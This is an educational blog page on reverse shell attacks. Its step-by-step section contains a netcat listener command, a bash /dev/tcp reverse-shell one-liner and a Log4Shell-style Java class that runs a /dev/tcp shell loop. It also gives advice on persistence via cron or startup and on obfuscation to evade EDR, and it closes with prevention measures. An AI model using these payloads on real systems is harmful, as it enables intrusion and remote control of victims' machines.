---
layout: learning
title: "Reverse Shell Attacks"
subtitle:  "Arbitrary Code Execution Made Easy"
date: 2023-11-10 15:45:31 +0530
categories: ["edu"]
tags: ["reverse-shell", "cybersecurity"]
author: "Karie Moorman"
---


<h3 align='center'>Table of Contents</h3>
<div class='tbl'>
<ul style='display: flex; flex-wrap: row; gap: 30px; margin-left: 10px; justify-content: center;'>
<li><a href='#overview'>Overview</a></li>
<li><a href='#how'>Step-by-Step</a></li>
<li><a href='#prevent'>Prevention</a></li>
</ul>
</div>

---

<h3 align='center' id='overview'>Overview</h3>

A reverse shell is a type of shell in which a target machine connects back to an attacker's machine, allowing the attacker to carry out remote command execution on the target machine. This is the opposite of the prototypical scenario, where an attacker connects to a victim machine to obtain a shell. Reverse shells are advantageous in that they effectively bypass firewall and network restrictions typically encountered with bind shells because the target machine calls to for the attacker's machine.

In a reverse shell attack, the attacker establishes a listening post on their own machine. The attacker then compromises a target machine and plants a script on the compromised target machine to initialize connection back to the attacker's system. Once the connection is established, it allows the attacker to have remote command execution on the target machine. This effectively provides the attacker with interactive access to the target system's command line or shell, enabling them to execute commands and potentially gain control over various aspects of the compromised system. 

Reverse shells are commonly used in hacking and penetration testing for various purposes, e.g., gaining unauthorized access to a system, executing commands, and exfiltrating data. 

--- 

<h3 align='center' id='how'>Step-by-Step</h3>

<h4>Step 1. Attacker sets up a listener.</h4>

The attacker sets up a program or script on their machine to listen for incoming connections. This is usually done using tools like Netcat, Metasploit, or other custom scripts. Use tools such as Metasploit allows the attacker to toggle between established connections, disable firewalls, and run exploits. 


```bash
nc -lvnp <port>
```

```bash
nc: netcat 

-l: This option instructs netcat to operate in listening mode. In this mode, netcat listens for incoming connections rather than initiating connections to a remote host.

-v: Enables verbose mode, providing more detailed information about the connections and data being transferred.

-n: This option tells netcat not to perform DNS resolution on incoming IP addresses, displaying numeric IP addresses instead of resolving them to hostnames.

-p: Specifies the port number to listen on. You need to provide a port number immediately after this option.

Optional: 

-k: Keeps process alive.

```

<h4>Step 2. Payload execution on the target.</h4>

The attacker somehow injects a payload into the target system, followed by escalation to root privileges. A successful attack could be executed through exploiting vulnerabilities (e.g., SQL Injection (SQLi), Cross-Site Scripting (XSS), malicious image/PDF files), social engineering, or other means. 

Common payload placements: 
- Add to startup, e.g., in custom shortcuts.

- Add as a scheduled task (e.g., cronjob).


<h4>Step 3. Target connects back. </h4>

Once the payload is executed on the target system (i.e., a local or cloud-based server), it initiates a connection back to the attacker's machine. This connection is typically established over a network protocol like TCP or UDP, e.g., 

A simple Bash script:

```bash
/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

A simple Bash script wrapped in Java (i.e., <a href='https://snyk.io/blog/log4j-rce-log4shell-vulnerability-cve-2021-44228/' target='_blank'>Log4J</a>): 

```java
public class Evil implements ObjectFactory {

   @Override
   public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
       String[] cmd = {
               "/bin/bash",
               "-c",
               "exec 5<>/dev/tcp/127.0.0.1/9001;cat <&5 | while read line; do $line 2>&5 >&5; done" };

       Runtime.getRuntime().exec(cmd);
       return null;
   }
}
```


Obfuscation and encryption methods are often used to bypass EDR detection. Also consider using polymorphic code, port-forwarding, and a persistant shell (e.g., `screen`, `tmux`) to ensure consistent connection between target and attacker machines. This also allows the payload to periodically check for an established connection and if no connection is detected, will try to establish a connection.

Attacker's machine will show successful connection established, e.g., 

```bash
nc -lvnp <port>
Connection to port <port> succeeded.
```

<h4>Step 4. Remote code execution via interactive shell. </h4>

After the connection is established, the attacker gains an interactive shell on the target system. This shell allows the attacker to execute commands on the target as if they had direct access to its command line.

---

<h3 align='center' id='prevent'>Prevention</h3>

Reduce the opportunity for reverse-shell attacks via system hardening.

- Execution statements:

Avoid statements in your code that can execute scripts or other pieces of code (e.g., `exec()`) as much as possible.

- Input Validation and Sanitization:

Consider all input as potentially malicious. Validate and sanitize both direct and indirect input to reduce opportunity for malicious code execution.

- Firewall Configuration:

Use a firewall to restrict incoming and outgoing network traffic. Only allow necessary ports and services to run. Disable unnecessary services and ports, especially those that are commonly exploited.

- Update and Patch Software:

Regularly update and patch your operating system and all installed software to address known vulnerabilities.

- Strong Authentication:

Enforce strong password policies and consider using multi-factor authentication (MFA) to add an extra layer of security.

- Least Privilege Principle:

Follow the principle of least privilege, where users and processes are granted only the minimum level of access necessary to perform their tasks. This includes personal-use computers; don’t run your application as root but create a user with the least privileges needed.

- Network Segmentation:

Segment your network to isolate critical systems and services. This can prevent lateral movement by attackers within your network.

- Disable Unnecessary Shell Commands:

Limit or disable unnecessary shell commands, especially those that can be used for remote code execution.

- File System Integrity Monitoring:

Implement file integrity monitoring tools to detect unauthorized changes to critical system files.

- Logging and Monitoring:

Enable comprehensive logging and regularly review logs for signs of suspicious activities. Log analysis can help in identifying and responding to security incidents. Implement Intrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS) to detect and block suspicious network activity such as reverse shell connections.